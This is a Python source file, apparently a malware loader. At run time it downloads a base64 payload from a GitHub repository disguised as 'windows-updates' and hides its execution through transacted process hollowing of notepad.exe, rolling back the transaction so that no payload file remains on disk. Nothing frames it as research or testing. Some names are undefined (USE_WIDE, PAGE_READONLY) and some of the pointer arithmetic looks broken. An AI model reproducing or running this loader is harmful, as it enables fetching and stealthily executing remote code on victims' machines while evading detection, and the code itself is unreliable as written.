import ctypes,struct,base64,urllib.request,json
from ctypes import wintypes
PAYLOAD_URL="https://raw.githubusercontent.com/Quincyzx/windows-updates/refs/heads/main/payload.json"
PROCESS_ALL_ACCESS=0x1F0FFF
MEM_COMMIT=0x1000
MEM_RESERVE=0x2000
PAGE_EXECUTE_READWRITE=0x40
CREATE_SUSPENDED=0x4
CONTEXT_FULL=0x10007
SEC_IMAGE=0x1000000
SECTION_MAP_READ=0x4
SECTION_MAP_EXECUTE=0x8
SECTION_MAP_WRITE=0x2
FILE_MAP_EXECUTE=0x20

# NT API structures
class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_=[("Length",wintypes.ULONG),("RootDirectory",wintypes.HANDLE),("ObjectName",wintypes.LPVOID),("Attributes",wintypes.ULONG),("SecurityDescriptor",wintypes.LPVOID),("SecurityQualityOfService",wintypes.LPVOID)]

class UNICODE_STRING(ctypes.Structure):
    _fields_=[("Length",ctypes.c_ushort),("MaximumLength",ctypes.c_ushort),("Buffer",wintypes.LPWSTR)]

class STARTUPINFO(ctypes.Structure):
    _fields_=[("cb",wintypes.DWORD),("lpReserved",wintypes.LPSTR),("lpDesktop",wintypes.LPSTR),("lpTitle",wintypes.LPSTR),("dwX",wintypes.DWORD),("dwY",wintypes.DWORD),("dwXSize",wintypes.DWORD),("dwYSize",wintypes.DWORD),("dwXCountChars",wintypes.DWORD),("dwYCountChars",wintypes.DWORD),("dwFillAttribute",wintypes.DWORD),("dwFlags",wintypes.DWORD),("wShowWindow",wintypes.WORD),("cbReserved2",wintypes.WORD),("lpReserved2",wintypes.LPBYTE),("hStdInput",wintypes.HANDLE),("hStdOutput",wintypes.HANDLE),("hStdError",wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_=[("hProcess",wintypes.HANDLE),("hThread",wintypes.HANDLE),("dwProcessId",wintypes.DWORD),("dwThreadId",wintypes.DWORD)]

class CONTEXT(ctypes.Structure):
    _fields_=[("P1Home",ctypes.c_uint64),("P2Home",ctypes.c_uint64),("P3Home",ctypes.c_uint64),("P4Home",ctypes.c_uint64),("P5Home",ctypes.c_uint64),("P6Home",ctypes.c_uint64),("ContextFlags",ctypes.c_uint32),("MxCsr",ctypes.c_uint32),("SegCs",ctypes.c_uint16),("SegDs",ctypes.c_uint16),("SegEs",ctypes.c_uint16),("SegFs",ctypes.c_uint16),("SegGs",ctypes.c_uint16),("SegSs",ctypes.c_uint16),("EFlags",ctypes.c_uint32),("Dr0",ctypes.c_uint64),("Dr1",ctypes.c_uint64),("Dr2",ctypes.c_uint64),("Dr3",ctypes.c_uint64),("Dr6",ctypes.c_uint64),("Dr7",ctypes.c_uint64),("Rax",ctypes.c_uint64),("Rcx",ctypes.c_uint64),("Rdx",ctypes.c_uint64),("Rbx",ctypes.c_uint64),("Rsp",ctypes.c_uint64),("Rbp",ctypes.c_uint64),("Rsi",ctypes.c_uint64),("Rdi",ctypes.c_uint64),("R8",ctypes.c_uint64),("R9",ctypes.c_uint64),("R10",ctypes.c_uint64),("R11",ctypes.c_uint64),("R12",ctypes.c_uint64),("R13",ctypes.c_uint64),("R14",ctypes.c_uint64),("R15",ctypes.c_uint64),("Rip",ctypes.c_uint64)]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_=[("Reserved1",ctypes.c_void_p),("PebBaseAddress",ctypes.c_void_p),("Reserved2",ctypes.c_void_p*2),("UniqueProcessId",ctypes.c_void_p),("Reserved3",ctypes.c_void_p)]

ProcessBasicInformation=0
PEB_IMAGEBASE_OFFSET=0x10

k=ctypes.windll.kernel32
n=ctypes.windll.ntdll

# NT API functions
NtCreateSection=n.NtCreateSection
NtCreateSection.argtypes=[ctypes.POINTER(wintypes.HANDLE),wintypes.DWORD,ctypes.POINTER(OBJECT_ATTRIBUTES),ctypes.POINTER(ctypes.c_uint64),wintypes.ULONG,wintypes.ULONG,wintypes.HANDLE]
NtCreateSection.restype=ctypes.c_ulong

NtMapViewOfSection=n.NtMapViewOfSection
NtMapViewOfSection.argtypes=[wintypes.HANDLE,wintypes.HANDLE,ctypes.POINTER(ctypes.c_void_p),ctypes.c_ulonglong,ctypes.c_size_t,ctypes.POINTER(ctypes.c_uint64),ctypes.POINTER(ctypes.c_size_t),ctypes.c_uint32,ctypes.c_ulong,ctypes.c_ulong]
NtMapViewOfSection.restype=ctypes.c_ulong

NtUnmapViewOfSection=n.NtUnmapViewOfSection
NtUnmapViewOfSection.argtypes=[wintypes.HANDLE,ctypes.c_void_p]
NtUnmapViewOfSection.restype=ctypes.c_ulong

NtQueryInformationProcess=n.NtQueryInformationProcess
NtQueryInformationProcess.argtypes=[wintypes.HANDLE,ctypes.c_int,ctypes.c_void_p,ctypes.c_ulong,ctypes.POINTER(ctypes.c_ulong)]
NtQueryInformationProcess.restype=ctypes.c_ulong

NtResumeProcess=n.NtResumeProcess
NtResumeProcess.argtypes=[wintypes.HANDLE]
NtResumeProcess.restype=ctypes.c_ulong

CreateProcessA=k.CreateProcessA
CreateProcessA.argtypes=[wintypes.LPCSTR,wintypes.LPSTR,wintypes.LPVOID,wintypes.LPVOID,wintypes.BOOL,wintypes.DWORD,wintypes.LPVOID,wintypes.LPCSTR,ctypes.POINTER(STARTUPINFO),ctypes.POINTER(PROCESS_INFORMATION)]
CreateProcessA.restype=wintypes.BOOL

ReadProcessMemory=k.ReadProcessMemory
ReadProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]
ReadProcessMemory.restype=wintypes.BOOL

WriteProcessMemory=k.WriteProcessMemory
WriteProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]
WriteProcessMemory.restype=wintypes.BOOL

GetThreadContext=k.GetThreadContext
GetThreadContext.argtypes=[wintypes.HANDLE,ctypes.POINTER(CONTEXT)]
GetThreadContext.restype=wintypes.BOOL

SetThreadContext=k.SetThreadContext
SetThreadContext.argtypes=[wintypes.HANDLE,ctypes.POINTER(CONTEXT)]
SetThreadContext.restype=wintypes.BOOL

CloseHandle=k.CloseHandle
CloseHandle.argtypes=[wintypes.HANDLE]
CloseHandle.restype=wintypes.BOOL

# Transaction APIs (using KtmW32.dll - load dynamically with GetProcAddress)
ktm_dll=ctypes.WinDLL("ktmw32.dll")
GetProcAddress=k.GetProcAddress
GetProcAddress.argtypes=[wintypes.HMODULE,wintypes.LPCSTR]
GetProcAddress.restype=wintypes.LPVOID
GetModuleHandleA=k.GetModuleHandleA
GetModuleHandleA.argtypes=[wintypes.LPCSTR]
GetModuleHandleA.restype=wintypes.HMODULE

# Load functions dynamically
LoadLibraryA=k.LoadLibraryA
LoadLibraryA.argtypes=[wintypes.LPCSTR]
LoadLibraryA.restype=wintypes.HMODULE
hKtm=LoadLibraryA(b"ktmw32.dll")
if not hKtm:raise Exception("Cannot load ktmw32.dll")

CreateTransactionAddr=GetProcAddress(hKtm,b"CreateTransaction")
if not CreateTransactionAddr:raise Exception("CreateTransaction not found")
CreateTransaction=ctypes.WINFUNCTYPE(wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID)(CreateTransactionAddr)

# Try W version first, fallback to A version
CreateFileTransactedAddr=GetProcAddress(hKtm,b"CreateFileTransactedW")
useWide=True
if not CreateFileTransactedAddr:
    CreateFileTransactedAddr=GetProcAddress(hKtm,b"CreateFileTransactedA")
    useWide=False
if not CreateFileTransactedAddr:raise Exception("CreateFileTransacted not found")
if useWide:
    CreateFileTransacted=ctypes.WINFUNCTYPE(wintypes.HANDLE,wintypes.LPCWSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID)(CreateFileTransactedAddr)
else:
    CreateFileTransacted=ctypes.WINFUNCTYPE(wintypes.HANDLE,wintypes.LPCSTR,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.DWORD,wintypes.DWORD,wintypes.LPVOID,wintypes.HANDLE,wintypes.LPVOID,wintypes.LPVOID)(CreateFileTransactedAddr)

RollbackTransactionAddr=GetProcAddress(hKtm,b"RollbackTransaction")
if not RollbackTransactionAddr:raise Exception("RollbackTransaction not found")
RollbackTransaction=ctypes.WINFUNCTYPE(wintypes.BOOL,wintypes.HANDLE)(RollbackTransactionAddr)

WriteFile=k.WriteFile
WriteFile.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.DWORD,ctypes.POINTER(wintypes.DWORD),wintypes.LPVOID]
WriteFile.restype=wintypes.BOOL

def transacted_hollow(payload):
    # Create NTFS transaction (file won't be on disk until committed - we rollback, so never on disk)
    hTransaction=CreateTransaction(None,None,0,0,0,0,None)
    if hTransaction==-1:return False
    
    # Create transacted file (hidden until commit - we rollback, so it's never on disk)
    if USE_WIDE:
        transactedPath="C:\\Windows\\Temp\\svchost.tmp"
        hTransactedFile=CreateFileTransacted(transactedPath,0x40000000|0x80000000,0,None,2,0x80,None,hTransaction,None,None)
    else:
        transactedPath=b"C:\\Windows\\Temp\\svchost.tmp"
        hTransactedFile=CreateFileTransacted(transactedPath,0x40000000|0x80000000,0,None,2,0x80,None,hTransaction,None,None)
    if hTransactedFile==-1:
        CloseHandle(hTransaction)
        return False
    
    # Write payload to transacted file
    written=wintypes.DWORD()
    WriteFile(hTransactedFile,payload,len(payload),ctypes.byref(written),None)
    
    # Create section from transacted file (SEC_IMAGE requires a file)
    hSection=wintypes.HANDLE()
    size=ctypes.c_uint64(len(payload))
    status=NtCreateSection(ctypes.byref(hSection),wintypes.DWORD(0xF0000000),None,ctypes.byref(size),PAGE_READONLY,SEC_IMAGE,hTransactedFile)
    CloseHandle(hTransactedFile)
    if status!=0:
        RollbackTransaction(hTransaction)
        CloseHandle(hTransaction)
        return False
    
    # Rollback transaction - file never appears on disk!
    RollbackTransaction(hTransaction)
    CloseHandle(hTransaction)
    
    # Map section into current process
    localBase=ctypes.c_void_p()
    viewSize=ctypes.c_size_t(0)
    status=NtMapViewOfSection(hSection,ctypes.windll.kernel32.GetCurrentProcess(),ctypes.byref(localBase),0,0,None,ctypes.byref(viewSize),2,0,PAGE_EXECUTE_READWRITE)
    if status!=0:
        CloseHandle(hSection)
        return False
    
    # Section is already loaded from file, no need to write
    
    # Create notepad in suspended state
    si=STARTUPINFO()
    si.cb=ctypes.sizeof(STARTUPINFO)
    pi=PROCESS_INFORMATION()
    if not CreateProcessA(None,b"C:\\Windows\\System32\\notepad.exe",None,None,False,CREATE_SUSPENDED,None,None,ctypes.byref(si),ctypes.byref(pi)):
        NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
        CloseHandle(hSection)
        return False
    
    # Get PEB
    pbi=PROCESS_BASIC_INFORMATION()
    returnLength=ctypes.c_ulong()
    status=NtQueryInformationProcess(pi.hProcess,ProcessBasicInformation,ctypes.byref(pbi),ctypes.sizeof(pbi),ctypes.byref(returnLength))
    if status!=0:
        k.TerminateProcess(pi.hProcess,0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
        CloseHandle(hSection)
        return False
    
    # Read original image base
    originalBase=ctypes.c_void_p()
    bytesRead=ctypes.c_size_t()
    ReadProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(originalBase),ctypes.sizeof(ctypes.c_void_p),ctypes.byref(bytesRead))
    
    # Unmap original image
    NtUnmapViewOfSection(pi.hProcess,originalBase)
    
    # Map our section into target process
    remoteBase=ctypes.c_void_p()
    viewSize=ctypes.c_size_t(0)
    status=NtMapViewOfSection(hSection,pi.hProcess,ctypes.byref(remoteBase),0,0,None,ctypes.byref(viewSize),2,0,PAGE_EXECUTE_READWRITE)
    if status!=0:
        k.TerminateProcess(pi.hProcess,0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
        CloseHandle(hSection)
        return False
    
    # Update PEB image base
    WriteProcessMemory(pi.hProcess,ctypes.cast(pbi.PebBaseAddress,ctypes.POINTER(ctypes.c_byte))+PEB_IMAGEBASE_OFFSET,ctypes.byref(remoteBase),ctypes.sizeof(ctypes.c_void_p),None)
    
    # Get entry point from PE headers
    dosHeader=ctypes.create_string_buffer(64)
    ReadProcessMemory(pi.hProcess,remoteBase,dosHeader,64,None)
    peOffset=struct.unpack('<I',dosHeader[60:64])[0]
    ntHeaders=ctypes.create_string_buffer(256)
    ReadProcessMemory(pi.hProcess,ctypes.cast(remoteBase,ctypes.POINTER(ctypes.c_byte))+peOffset,ntHeaders,256,None)
    entryPointRVA=struct.unpack('<I',ntHeaders[24:28])[0]
    entryPoint=ctypes.cast(remoteBase,ctypes.POINTER(ctypes.c_byte))+entryPointRVA
    
    # Update thread context (use CONTEXT_INTEGER and set Rcx for x64 entry point)
    ctx=CONTEXT()
    ctx.ContextFlags=0x10001  # CONTEXT_INTEGER
    GetThreadContext(pi.hThread,ctypes.byref(ctx))
    ctx.Rcx=ctypes.cast(entryPoint,ctypes.c_uint64).value
    ctx.Rip=ctypes.cast(entryPoint,ctypes.c_uint64).value
    SetThreadContext(pi.hThread,ctypes.byref(ctx))
    
    # Resume process
    NtResumeProcess(pi.hProcess)
    
    # Cleanup (transaction already rolled back - file never appeared on disk!)
    NtUnmapViewOfSection(ctypes.windll.kernel32.GetCurrentProcess(),localBase)
    CloseHandle(hSection)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return True

# Execute
payload_b64=json.loads(urllib.request.urlopen(PAYLOAD_URL).read().decode())["payload"]
payload=base64.b64decode(payload_b64)
transacted_hollow(payload)
